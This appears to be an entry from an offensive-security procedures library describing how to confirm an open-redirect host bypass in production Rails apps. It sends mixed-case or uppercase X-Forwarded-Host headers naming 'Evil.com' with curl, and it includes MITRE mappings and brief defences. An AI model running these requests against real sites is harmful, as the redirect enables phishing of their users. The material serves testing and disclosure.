---
id: uuid-verify-production
tags:
  - open-redirect
  - host-bypass
  - production
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-mixed-case-x-forwarded-host]]'
  - '[[commands/curl-uppercase-x-forwarded-host]]'
verified: false
platforms:
  - Web
  - Ruby
  - Rails
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:29:09.619Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Verify-Host-Bypass-in-Production-Rails-Environment

## Summary

This procedure tests the host bypass vulnerability in a production-configured Rails environment with specific allowed hosts, confirming that crafted X-Forwarded-Host headers enable open redirects despite restrictions.

## Description

Production setups often configure Rails.application.config.hosts = %w(.EXAMPLE.com) for security. The vulnerability persists here, as the middleware's parsing flaw affects forwarded headers similarly. Use this to assess impact on live systems, potentially leading to phishing via user redirects.

## Requirements

1. Rails app in production mode with host config (e.g., RAILS_ENV=production)
2. Access to production endpoint (adapt localhost to actual URL)
3. curl for testing

## Defense

Defensive measures and detection strategies:

- Enforce strict host whitelisting with case normalization
- Deploy IDS to flag suspicious redirects and header values
- Conduct regular vulnerability scans for Rails components

## Objectives

1. Confirm bypass in restricted production config
2. Evaluate real-world exploit potential
3. Support vulnerability disclosure

## Instructions

### Step 1: Configure Production Hosts

**Context**: Set allowed hosts in production to simulate secure setup.

**Command** (Manual config):

In `config/environments/production.rb`:
```ruby
config.hosts = %w(.example.com)
```

> Limits redirects to .example.com; restart server.

### Step 2: Test Bypass with Crafted Headers

**Context**: Repeat exploitation using mixed or uppercase headers against production endpoint.

**Command** ([[commands/curl-mixed-case-x-forwarded-host]] or [[commands/curl-uppercase-x-forwarded-host]] - adapt URL):
```bash
curl 'https://production.example.com/tests' -H 'X-Forwarded-Host: Evil.com'
```

> If bypass succeeds, redirect to http://Evil.com/ despite config.

### Step 3: Validate Impact

**Context**: Check for unauthorized redirect in production logs/response.

**Command** (Follow redirect):
```bash
curl -L 'https://production.example.com/tests' -H 'X-Forwarded-Host: EVIL.COM'
```

> Expected: Redirect HTML to malicious site; confirms high-impact vulnerability.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/curl-mixed-case-x-forwarded-host]]
- [[commands/curl-uppercase-x-forwarded-host]]

## Tools Used

- [[tools/curl]]

## Tags

- open-redirect
- host-bypass
- production
